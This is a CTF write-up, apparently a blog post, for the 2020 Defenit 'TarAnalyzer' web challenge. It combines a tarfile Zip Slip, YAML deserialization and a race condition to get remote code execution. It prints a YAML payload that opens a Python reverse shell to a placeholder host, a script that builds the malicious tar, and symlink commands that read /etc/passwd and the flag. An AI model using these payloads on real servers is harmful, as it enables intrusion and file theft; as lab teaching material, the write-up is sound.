---
title: TarAnalyzer - 2020 Defenit CTF
date: 2020-06-07 23:00:00
author: c3rb3ru5
author_url: https://twitter.com/__c3rb3ru5__
categories:
 - Web Exploitation
tags:
 - YAML
 - Zip Slip
 - Race Condition
 - Symlink
 - Defenit
---

**tl;dr**

+ Zip Slip Vulnerability + YAML Deserialization Attack + Race Condition
+ Unintended Solution: Upload symlink leading to arbitarary file reads

<!--more-->

**Solved by**: [c3rb3ru5](https://twitter.com/__c3rb3ru5__)

## Challenge Description

Our developer built simple web server for analyzing tar file and extracting online. He said server is super safe. Is it?
Download source code from [here](tar-analyzer.tar.gz)

## Analysis

1. We are given a web app which extracts all the files to the server from any tarfile that we upload.
2. Endpoints
  - GET `/`
  - GET `/<path:host>`
    - Read uploaded files from server.
    - Protection against Path Traversal.
  - POST `/analyze`
    - Upload Tar Archives.
    - Uses `extractall()` whose [documentation](https://docs.python.org/3/library/tarfile.html#tarfile.TarFile.extractall) states that files can be created outside of the path.
  - GET `/admin`
    - `Serializes` hardcoded data into `YAML` and writes to file `config.yaml`.
    - Also `deserializes` the YAML stream from the file and checks for the `host`.
3. The application uses `tarfile` python library which has some vulnerabilities like:
  - Path Traversal
  - Symlink File Attack
  - [More Info](https://bugs.python.org/issue21109)
4. The application uses `yaml` and write serialized payload to the file `config.yaml` and also deserializes the contents of that file later on, so a possible deserialization attack can be performed.

## Solution
When `/admin` is serviced, `initialization()` function is called, in which we know that the file `config.yaml` has data written to it and, thereafter it is also being read when `hostcheck()` function is called. So there is a short timespan between the writing and reading, so if in between that time, we can overwrite that file, with our payload, then we can perform a Race Condition, acknowledging that the time frame will be somewhat small.

#### In `initialization()`:
```python
def initializing():
    try:
        with open('config.yaml', 'w') as fp: 
            data = {'allow_host':'127.0.0.1', 'message':'Hello Admin!'}
            fp.write(dump(data))

    except:
        return False
```

#### In `hostcheck()`:
```python
def hostcheck(host):
    try:
        with open('config.yaml', 'rb') as fp: 
            config = load(fp.read(), Loader=Loader)

        if config['allow_host'] == host:
            return config['message']

        else:
            raise()

    except:
        return False
```

The Zip Slip is a widespread critical archive extraction vulnerability, with which we can write arbitrary files on the server, that may rresult in RCE. It was found in the [research](https://github.com/snyk/zip-slip-vulnerability#affected-libraries) by the Snyk Security team, and they also found out that the Python `tarfile` library was affected by it.

So using the Zip Slip vulnerability, which basically arises because of the `extractall()` function, it does not check if the  we can create a file with the name `../../config.yaml` and it will overwrite the existing file which had the hardcoded data.

After this is done, the contents of `config.yaml` which we overwrote will be deserialized. So we can create a YAML deserialization payload which creates a reverse shell and then get RCE on the server.

For more information on YAML Deserialization, refer to this [whitepaper](https://dl.packetstormsecurity.net/papers/general/yaml-deserialization.pdf) by [\_j0lt](https://twitter.com/_j0lt) and [lon3\_rang3r](https://twitter.com/lon3_rang3r).

#### RCE Payload:
```
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - python
  - -c
  - "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('HOST',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
```

You can use [Peas](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) to create the payload.

#### Create Malicious TarFile
```python
import tarfile
import io

tar = tarfile.TarFile('malicious.tar', 'w')

info = tarfile.TarInfo("../../config.yaml")

HOST = 'localhost'
PORT = 1234

deserialization_payload = """ 
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - python
    - -c
      - "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{}',{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
""".format(HOST, PORT)

info.size=len(deserialization_payload)
info.mode=0o444 # So it cannot be overwritten

tar.addfile(info, io.BytesIO(deserialization_payload))
tar.close()
```

So combining Zip Slip and YAML Deserialization and performing a Race Condition will get us a reverse shell on our HOST.

## Unintended Solution
During the CTF, we solved this challenge by using Symlinked files, and I came to know of the intended solution posted above from the post-ctf discussions on Discord.

This vulnerability can be found [here](https://bugs.python.org/issue21109)

So trying to read `/etc/passwd`:

```bash
ln -s /etc/passwd passwd
tar -cvf malicious.tar passwd
```

We got:

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
analyzer:x:1000:1000:Linux User,,,:/home/analyzer:
```

Trying commonn flag locations:

```bash
ln -s /flag.txt flag
tar -cvf malicious.tar flag
```

And we got the flag.

## Flag
`Defenit{R4ce_C0nd1710N_74r_5L1P_w17H_Y4ML_Rce!}`
